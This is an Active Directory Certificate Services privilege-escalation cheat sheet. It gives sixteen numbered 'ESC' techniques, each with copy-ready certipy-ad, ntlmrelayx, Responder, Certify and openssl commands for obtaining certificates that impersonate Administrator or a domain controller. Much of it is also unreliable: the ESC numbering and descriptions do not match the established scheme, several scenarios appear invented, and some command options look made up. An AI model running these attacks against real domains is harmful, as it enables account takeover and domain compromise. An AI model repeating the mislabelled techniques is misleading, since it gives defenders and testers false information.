---
icon: key
---

# Privilege Escalation



***

## Enumeration

#### Find Vulnerable Templates

```bash
certipy-ad find -u user -p pass -dc-ip <dc-ip>
```

_Scans AD environment for certificate templates and identifies vulnerable configurations_

```bash
certipy-ad find -u user -p pass -dc-ip <dc-ip> --vulnerable
```

_Shows only templates with exploitable misconfigurations_

***

### ESC1 – Enrollment Agent Certificate Abuse

**What it is:** Request certificates on behalf of other users (like Domain Admin) using Enrollment Agent template

**Requirements:**

* Template has `ENROLLEE_SUPPLIES_SUBJECT` flag
* Certificate Request Agent EKU present
* You have enroll rights + Enrollment Agent rights

#### Exploitation

```bash
# Step 1: Request certificate as Administrator
certipy-ad req -u 'youruser' -p 'yourpass' \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -template 'EnrollmentAgentTemplate' \
  -target 'Administrator' \
  -on-behalf-of 'Administrator' \
  -pfx administrator.pfx
```

_Requests certificate for Administrator using Enrollment Agent privileges_

```bash
# Step 2: Authenticate using the certificate
certipy-ad auth -pfx administrator.pfx
```

_Uses the obtained PFX certificate to authenticate as Administrator_

***

### ESC2 – Subject Supply with Client Auth

**What it is:** Request certs for any user by supplying arbitrary subject/UPN fields

**Requirements:**

* Template has `ENROLLEE_SUPPLIES_SUBJECT = True`
* Client Authentication EKU enabled
* Low-priv users can enroll

#### Exploitation

```bash
# Request certificate for Administrator
certipy-ad req -u lowpriv -p pass123 \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -template 'VulnerableUserTemplate' \
  -upn 'Administrator@sn0xsec.local' \
  -pfx administrator.pfx
```

_Requests certificate with Administrator's UPN to impersonate them_

```bash
# Authenticate as Administrator
certipy-ad auth -pfx administrator.pfx
```

_Uses forged certificate to get Administrator's NTLM hash and TGT_

***

### ESC3 – Client Auth with No Subject Restrictions

**What it is:** Enroll in templates with Client Authentication but without requiring subject supply

**Requirements:**

* Client Authentication EKU present
* `ENROLLEE_SUPPLIES_SUBJECT = False`
* Any authenticated user can enroll
* No approval required

#### Exploitation

```bash
# Request certificate for current user
certipy-ad req -u lowpriv -p pass123 \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -template 'UserTemplate' \
  -pfx lowpriv.pfx
```

_Requests certificate for yourself that can be used for lateral movement_

```bash
# Authenticate with certificate
certipy-ad auth -pfx lowpriv.pfx
```

_Uses certificate for Kerberos PKINIT authentication_

***

### ESC4 – NTLM Relay to AD CS Web Enrollment

**What it is:** Relay NTLM authentication to AD CS web interface to obtain victim's certificate

**Requirements:**

* AD CS Web Enrollment (certsrv) enabled
* Can capture/relay NTLM authentication
* No Extended Protection for Authentication (EPA)

#### Exploitation

```bash
# Start NTLM relay to AD CS
ntlmrelayx.py -t http://ca.sn0xsec.local/certsrv/ \
  --adcs --template VulnerableTemplate
```

_Relays captured NTLM authentication to web enrollment interface_

```bash
# Use Responder to capture NTLM
responder -I eth0 -v
```

_Captures NTLM authentication attempts from network traffic_

```bash
# Authenticate with relayed certificate
certipy-ad auth -pfx victim.pfx
```

_Uses certificate obtained through relay to impersonate victim_

***

### ESC5 – WriteDACL/FullControl on Template

**What it is:** Modify template permissions to make it exploitable if you have write access

**Requirements:**

* You have `WriteDACL`, `GenericAll`, or `FullControl` on template
* Can modify permissions, EKUs, and flags

#### Exploitation (Windows - Certify)

```powershell
# Add enroll rights for your user
Certify.exe template /template:CorpUser /add_enroll:SN0XSEC\attacker
```

_Grants yourself enrollment permissions on target template_

```powershell
# Modify template to add dangerous flags
Certify.exe template /template:CorpUser \
  /seteku:"Client Authentication" \
  /enrolleeSupplySubject:true
```

_Configures template to allow subject supply and client authentication_

```bash
# Request certificate as Administrator
certipy-ad req -u attacker -p password \
  -template CorpUser \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -upn 'Administrator@sn0xsec.local' \
  -pfx admin.pfx
```

_Requests certificate with modified template to impersonate Administrator_

#### Identify

```powershell
# Find templates with writable ACLs
Find-InterestingACE -ResolveGUIDs | ? {$_.ObjectType -eq 'EnrollmentServices'}
```

_Discovers certificate templates where you have dangerous permissions_

***

### ESC6 – CA Permissions Abuse

**What it is:** Abuse ManageCA/ManageTemplates rights to attach vulnerable templates

**Requirements:**

* You have `ManageCA`, `ManageTemplates`, or `Owner` rights on CA
* Can add/modify templates on CA

#### Exploitation

```powershell
# Attach vulnerable template to CA
Set-CATemplate -Name "CA-NAME" -TemplatesToAdd "ESC2LikeTemplate"
```

_Adds an exploitable template to the Certificate Authority_

```bash
# Request certificate from newly attached template
certipy-ad req -u attacker -p pass123 \
  -template ESC2LikeTemplate \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -upn 'Administrator@sn0xsec.local' \
  -pfx admin.pfx
```

_Requests certificate using template you added to CA_

#### Identify

```powershell
# Find CAs where you have rights
Find-InterestingACE -ResolveGUIDs | ? {$_.ObjectType -eq 'EnrollmentServices'}
```

_Identifies Certificate Authorities with writable permissions_

```bash
# Enumerate CA settings
certutil -dump
```

_Displays CA configuration and associated templates_

***

### ESC7 – Weak EKU Validation / CTL Abuse

**What it is:** Abuse weak Certificate Trust Lists or missing EKU enforcement

**Requirements:**

* Template has weak/missing EKUs (e.g., "Any Purpose")
* Services don't enforce strict EKU validation
* No proper CTL enforcement

#### Exploitation

```bash
# Request certificate with weak EKUs
certipy-ad req -u attacker -p password \
  -template WeakEKUTemplate \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -upn 'Administrator@sn0xsec.local' \
  -pfx admin.pfx
```

_Requests certificate from template with overly permissive EKU settings_

```bash
# Authenticate with certificate
certipy-ad auth -pfx admin.pfx
```

_Uses certificate despite weak EKU validation_

***

### ESC8 – SAN/UPN Spoofing

**What it is:** Supply arbitrary Subject Alternative Names to impersonate users

**Requirements:**

* `ENROLLEE_SUPPLIES_SUBJECT = True`
* Client Authentication EKU
* Can specify custom UPN/DNS SAN

#### Exploitation

```bash
# Request certificate with spoofed UPN
certipy-ad req -u attacker -p password \
  -template SpoofableTemplate \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -upn 'Administrator@sn0xsec.local' \
  -pfx admin.pfx
```

_Creates certificate with Administrator's UPN in Subject Alternative Name_

```bash
# Authenticate as spoofed user
certipy-ad auth -pfx admin.pfx
```

_Uses spoofed identity certificate for authentication_

***

### ESC9 – Trusted Root CA Abuse

**What it is:** Add malicious root CA to trusted store and issue arbitrary certificates

**Requirements:**

* Can add trusted root CA to system/domain
* CTL is misconfigured or overly permissive
* System accepts chains from your root

#### Exploitation

```bash
# Create certificate request for target user
openssl req -new -newkey rsa:2048 -keyout admin.key \
  -out admin.csr -subj "/CN=Administrator@sn0xsec.local"
```

_Generates certificate signing request for Administrator_

```bash
# Sign certificate with attacker's root CA
openssl x509 -req -in admin.csr -CA attacker-root.crt \
  -CAkey attacker-root.key -out admin.crt -days 365 -CAcreateserial
```

_Issues certificate signed by your malicious root CA_

```bash
# Convert to PFX format
openssl pkcs12 -export -out admin.pfx -inkey admin.key -in admin.crt
```

_Creates PFX file for use with authentication tools_

```bash
# Authenticate with rogue certificate
certipy-ad auth -pfx admin.pfx
```

_Uses certificate from malicious root for authentication_

***

### ESC10 – UPN Injection Without Validation

**What it is:** Supply arbitrary UPN during enrollment without proper validation

**Requirements:**

* `ENROLLEE_SUPPLIES_SUBJECT = True`
* Client Authentication EKU
* CA doesn't validate UPN during issuance

#### Exploitation

```bash
# Request certificate with injected UPN
certipy-ad req -u attacker -p password \
  -template AnyPurposeTemplate \
  -upn 'Administrator@sn0xsec.local' \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -pfx admin.pfx
```

_Injects Administrator's UPN into certificate request_

```bash
# Authenticate as Administrator
certipy-ad auth -pfx admin.pfx
```

_Uses injected UPN certificate for privileged access_

***

### ESC11 – Smartcard Logon Template Abuse

**What it is:** Abuse misconfigured smartcard logon templates

**Requirements:**

* Template supports Smartcard Logon
* Can self-enroll and supply arbitrary subject/SAN
* CA doesn't validate values

#### Exploitation

```bash
# Request smartcard certificate for Administrator
certipy-ad req -u attacker -p password \
  -template SmartcardTemplate \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -upn 'Administrator@sn0xsec.local' \
  -pfx smartcard.pfx
```

_Requests smartcard certificate with Administrator's credentials_

```bash
# Authenticate with smartcard certificate
certipy-ad auth -pfx smartcard.pfx
```

_Uses smartcard certificate to bypass normal authentication_

***

### ESC12 – Certificate Renewal Abuse

**What it is:** Renew certificates with elevated privileges if validation is weak

**Requirements:**

* You have valid certificate
* CA allows self-renewal
* UPN/SAN not re-validated during renewal

#### Exploitation

```bash
# Renew certificate with elevated UPN
certipy-ad renew -pfx attacker.pfx \
  -upn 'Administrator@sn0xsec.local' \
  -out admin_renewed.pfx
```

_Renews existing certificate but changes UPN to Administrator_

```bash
# Authenticate with renewed certificate
certipy-ad auth -pfx admin_renewed.pfx
```

_Uses renewed certificate with elevated privileges_

***

### ESC13 – Template Duplication

**What it is:** Create new template with dangerous flags if you have ManageTemplates rights

**Requirements:**

* You have `ManageTemplates` or `WriteDACL` on CA
* Can define new certificate templates

#### Exploitation

```powershell
# Create new dangerous template
New-CertificateTemplate -Name EvilTemplate \
  -SubjectNameSupplied -ClientAuthEKU \
  -EnrollRights attacker
```

_Creates new template with exploitable configuration_

```powershell
# Attach template to CA
Set-CATemplate -Name "CA-NAME" -TemplatesToAdd "EvilTemplate"
```

_Makes newly created template available on Certificate Authority_

```bash
# Request certificate from evil template
certipy-ad req -u attacker -p password \
  -template EvilTemplate \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -upn 'Administrator@sn0xsec.local' \
  -pfx admin.pfx
```

_Uses your malicious template to obtain Administrator certificate_

***

### ESC14 – Web Enrollment with DC Template

**What it is:** Request Domain Controller certificate via web enrollment

**Requirements:**

* CA exposes Web Enrollment (certsrv)
* Domain Controller template accessible
* Template doesn't restrict enrollment

#### Exploitation

```bash
# Relay NTLM to get DC certificate
ntlmrelayx.py -t http://ca.sn0xsec.local/certsrv/ \
  --adcs --template DomainController
```

_Relays authentication to request Domain Controller certificate_

```bash
# Use Responder to capture DC authentication
responder -I eth0 -v
```

_Captures NTLM from Domain Controller for relay_

***

### ESC15 – Shadow Credentials Attack

**What it is:** Abuse certificate authentication via msDS-KeyCredentialLink attribute

**Requirements:**

* You have `GenericWrite` or `WriteProperty` on target user
* Can modify `msDS-KeyCredentialLink` attribute
* Certificate-based auth enabled (PKINIT)

#### Exploitation

```bash
# Add shadow credential to target user
certipy-ad shadow-credentials -u attacker -p password \
  -target 'Administrator' -dc-ip <dc-ip>
```

_Creates alternate certificate credential linked to Administrator account_

```bash
# Authenticate using shadow credential
certipy-ad auth -shadow -pfx admin_shadow.pfx
```

_Uses shadow credential certificate to authenticate as Administrator_

***

### ESC16 – Certificate Publisher Abuse

**What it is:** Abuse Certificate Publisher role to publish arbitrary certificates

**Requirements:**

* You have `Certificate Publisher` rights on CA
* Environment uses AD-published certificates for auth
* Can craft certificate with spoofed identity

#### Exploitation

```bash
# Create certificate for Administrator
openssl req -new -newkey rsa:2048 -nodes -keyout admin.key \
  -out admin.csr -subj "/CN=Administrator@sn0xsec.local"
```

_Generates certificate request with Administrator's identity_

```bash
# Sign certificate with attacker CA
openssl x509 -req -in admin.csr -CA attacker-ca.crt \
  -CAkey attacker-ca.key -out admin.crt -days 365 -CAcreateserial
```

_Signs certificate using controlled CA_

```bash
# Create PFX file
openssl pkcs12 -export -out admin.pfx -inkey admin.key \
  -in admin.crt -passout pass:1234
```

_Packages certificate into PFX format_

```bash
# Publish certificate to target user in AD
certipy-ad forge -u attacker -p 'password' \
  -target 'Administrator' \
  -ca 'ca.sn0xsec.local\CA-NAME' \
  -publish -pfx admin.pfx
```

_Publishes forged certificate to Administrator's AD object_

```bash
# Authenticate as Administrator
certipy-ad auth -pfx admin.pfx
```

_Uses published certificate for authentication_

***

### Quick Reference

| ESC   | Attack Type      | Key Requirement                           |
| ----- | ---------------- | ----------------------------------------- |
| ESC1  | Enrollment Agent | Certificate Request Agent EKU             |
| ESC2  | Subject Supply   | ENROLLEE\_SUPPLIES\_SUBJECT + Client Auth |
| ESC3  | Client Auth      | Client Auth EKU, no subject restrictions  |
| ESC4  | NTLM Relay       | Web Enrollment enabled                    |
| ESC5  | WriteDACL        | Write permissions on template             |
| ESC6  | CA Abuse         | ManageCA/ManageTemplates rights           |
| ESC7  | Weak EKU         | Poor CTL/EKU enforcement                  |
| ESC8  | SAN Spoof        | Can supply arbitrary SAN/UPN              |
| ESC9  | Root Trust       | Control trusted root CA                   |
| ESC10 | UPN Inject       | No UPN validation                         |
| ESC11 | Smartcard        | Misconfigured smartcard template          |
| ESC12 | Renewal          | Weak renewal validation                   |
| ESC13 | Template Dup     | ManageTemplates rights                    |
| ESC14 | DC Web           | DC template via web enrollment            |
| ESC15 | Shadow Creds     | Write to msDS-KeyCredentialLink           |
| ESC16 | Publisher        | Certificate Publisher role                |

***
